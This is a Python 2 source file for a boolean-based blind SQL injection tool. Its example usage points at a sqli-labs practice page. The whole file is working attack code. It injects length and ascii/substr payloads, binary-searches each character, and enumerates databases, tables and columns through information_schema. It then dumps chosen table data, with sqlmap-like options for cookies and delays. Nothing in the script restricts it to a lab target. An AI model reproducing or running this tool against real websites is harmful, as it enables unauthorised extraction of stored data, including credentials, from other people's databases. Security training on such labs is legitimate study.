#-*- coding:utf-8 -*-
# python BoolSqli.py -u "http://172.21.50.66/Less-7/index.php?id=1'))" -o "You are in" -n "You have an error in your SQL syntax" --level DEBUG
import requests
import threading
import logging
import argparse
import sys
from time import sleep
from binascii import hexlify

class classlog(object):
    """log class"""
    def __init__(self,logfilename="log.txt",level="INFO"):
        level = level if level in ['CRITICAL','ERROR','WARNING','INFO','DEBUG','NOTSET'] else 'INFO'
        self.logger = logging.getLogger("classlog")
        self.logger.setLevel(logging.DEBUG)
        Fileformatter = logging.Formatter("%(asctime)s - %(filename)s - %(levelname)-8s:%(message)s",
        datefmt='%Y-%m-%d %I:%M:%S %p')
        Streamformatter = logging.Formatter("%(asctime)s %(filename)s %(levelname)s:%(message)s",
        datefmt='%Y-%m-%d %I:%M:%S')# ,filename='example.log')

        Filelog = logging.FileHandler(logfilename)
        Filelog.setFormatter(Fileformatter)
        Filelog.setLevel(logging.DEBUG)

        Streamlog = logging.StreamHandler()
        Streamlog.setFormatter(Streamformatter)
        Streamlog.setLevel(level)

        self.logger.addHandler(Filelog)
        self.logger.addHandler(Streamlog)

    def debug(self,msg):
        self.logger.debug(msg)

    def info(self,msg):
        self.logger.info(msg)

    def warn(self,msg):
        self.logger.warn(msg)

    def error(self,msg):
        self.logger.error(msg)

    def critical(self,msg):
        self.logger.critical(msg)

class MyBoolSqli():
    """docstring for ClassName"""
    def __init__(self, target_url, ok_word, no_word):

        self.target_url = target_url

        self.payload_len = " and length(({value})) {opt} {asc_num} --+"
        self.payload_asc = " and ascii(substr(({value}),{asc_pos},1)) {opt} {asc_num}--+"

        self.payload_database = "SELECT group_concat(schema_name) FROM information_schema.schemata"
        self.payload_tables = "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema={database}"
        self.payload_columns = "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema={database} and table_name={table_name}"
        self.payload_data = "SELECT group_concat({columns}) FROM {table_name}"

        self.payload_len_gt = self.payload_len.format(value="{value}", asc_pos="{asc_pos}", asc_num="{asc_num}", opt=">")
        self.payload_len_lt = self.payload_len.format(value="{value}", asc_pos="{asc_pos}", asc_num="{asc_num}", opt="<")
        self.payload_asc_gt = self.payload_asc.format(value="{value}", asc_pos="{asc_pos}", asc_num="{asc_num}", opt=">")
        self.payload_asc_lt = self.payload_asc.format(value="{value}", asc_pos="{asc_pos}", asc_num="{asc_num}", opt="<")

    def run_get_database(self):
        payload = self.payload_database
        res = self.get_asc(payload)

    def run_get_tables(self, database):
        payload = self.payload_tables.format(database="0x" + hexlify(database))
        res = self.get_asc(payload)

    def run_get_columns(self, database, table_name):
        payload = self.payload_columns.format(database="0x" + hexlify(database), table_name="0x" + hexlify(table_name))
        res = self.get_asc(payload)

    def run_get_data(self, database, table_name, columns):
        payload = self.payload_data.format(table_name=table_name, columns=columns)
        res = self.get_asc(payload)

    def run_url(self, url):
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'}
        try:
            print url
            r = requests.get(url, headers=headers)
            if ok_word in r.text:
                return True
            elif no_word in r.text:
                return False
        except Exception, e:
            LOG.info(u"连接失败")
            sys.exit()

    def get_len(self, value):

        num = 50
        pre_l = 0
        pre_g = 0
        while True:
            LOG.debug(u"长度 " + str(int(num)))
            sleep(ARGV["delay"])
            if self.run_url(self.target_url + self.payload_len_lt.format(value=value, asc_num=int(num))):
                pre_l = num
                num = round((num + pre_g) / 2)

            elif self.run_url(self.target_url + self.payload_len_gt.format(value=value, asc_num=int(num))):
                pre_g = num
                if pre_l > num:
                    num = round((num + pre_l) / 2)
                else:
                    num = round((num + round(num / 2)))

            else:
                LOG.info(u"数据总长度 " + str(int(num)))
                return int(num)

    def get_asc(self, value):

        length = self.get_len(value)+1
        LOG.info(u"数据 ==>")
        print "+" + "-" * 22 + "+\n| ",

        for x in range(1, length):
            num = 127
            pre_l = 0
            pre_g = 0
            while True:
                LOG.debug(u"第 " + str(x) + u" 位 " + str(int(num)))
                sleep(ARGV["delay"])
                if self.run_url(self.target_url + self.payload_asc_lt.format(value=value, asc_pos=x, asc_num=int(num))):
                    pre_l = num
                    num = round((num + pre_g) / 2)

                elif self.run_url(self.target_url + self.payload_asc_gt.format(value=value, asc_pos=x, asc_num=int(num))):
                    pre_g = num
                    if pre_l > num:
                        num = round((num + pre_l) / 2)
                    else:
                        num = round((num + round(num / 2)))

                else:# self.run_url(self.target_url + self.payload_asc_eq.format(value=value, asc_pos=x, asc_num=int(num))):
                    if chr(int(num)) == ",":
                        print "\n+" + "-" * 22 + "+\n| ",
                    else:
                        sys.stdout.write(chr(int(num)))
                    break
        print "\n+" + "-" * 22 + "+"

def Argparse():

    parser = argparse.ArgumentParser(usage="%(prog)s [options]",add_help=False,

    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=(u'''
        作者：End1ng blog:end1ng.wordpress.com
        --------------------------------
        Boolean-based blind SQL injection'''))
    optional = parser.add_argument_group('optional arguments')
    optional.add_argument('-h', '--help', action="store_true", help='help of the %(prog)s program')
    optional.add_argument('--version', action='version', version='%(prog)s 1.1')

    args = parser.add_argument_group('Necessary parameter')

    args.add_argument('-u','--url',metavar=u'url',help=u'*目标url 多个用空格分隔')

    args.add_argument('-D',metavar=u'url',help=u'数据库名')
    args.add_argument('--dbs',action="store_true", help=u'读取数据库')

    args.add_argument('-T',metavar=u'url',help=u'表名')
    args.add_argument('--tables',action="store_true", help=u'读取表')

    args.add_argument('-C',nargs='*',metavar=u'url',help=u'列名')
    args.add_argument('--columns',action="store_true", help=u'读取列')

    args.add_argument('--dump',action="store_true", help=u'读取字段')

    args.add_argument('-o','--ok_word',metavar=u'str',help=u'正确页面关键词')
    args.add_argument('-n','--no_word',metavar=u'str',help=u'错误页面关键词')

    other = parser.add_argument_group('other arguments')
    other.add_argument('--level',metavar=u'level',help=u'程序运行级别:CRITICAL,ERROR,WARNING,INFO,DEBUG,NOTSET')
    other.add_argument('--delay',metavar=u'num',help=u'访问延迟')
    other.add_argument('--cookie',metavar=u'str',help=u'cookie')

    args=parser.parse_args()
    args = vars(args)

    if len(sys.argv) == 1 or args['help']:
        parser.print_help()
        sys.exit()
    if not args['url']:
        print u"请输入url"
        sys.exit()
    if not args["ok_word"]:
        print u"请输入正确页面关键词"
        sys.exit()
    if not args["no_word"]:
        print u"请输入错误页面关键词"
        sys.exit()
    if not args["delay"]:
        args["delay"] = 0
    return args

ARGV = Argparse()
LOG = classlog("log.txt", ARGV["level"])

for i,j in ARGV.items():
    LOG.debug(str(i).ljust(8) + ": " + str(j))

target_url = ARGV["url"]
ok_word = ARGV["ok_word"]
no_word = ARGV["no_word"]

lll = MyBoolSqli(target_url, ok_word, no_word)

try:
    if ARGV["dbs"]:
        lll.run_get_database()
    if ARGV["tables"]:
        lll.run_get_tables(ARGV["D"])
    if ARGV["columns"]:
        lll.run_get_columns(ARGV["D"], ARGV["T"])
    if ARGV["dump"]:
        value = ""
        for x in ARGV["C"]:
            value += x + ",0x20,"
        lll.run_get_data(ARGV["D"], ARGV["T"], value[:-6])
except:
    LOG.error(u"参数错误")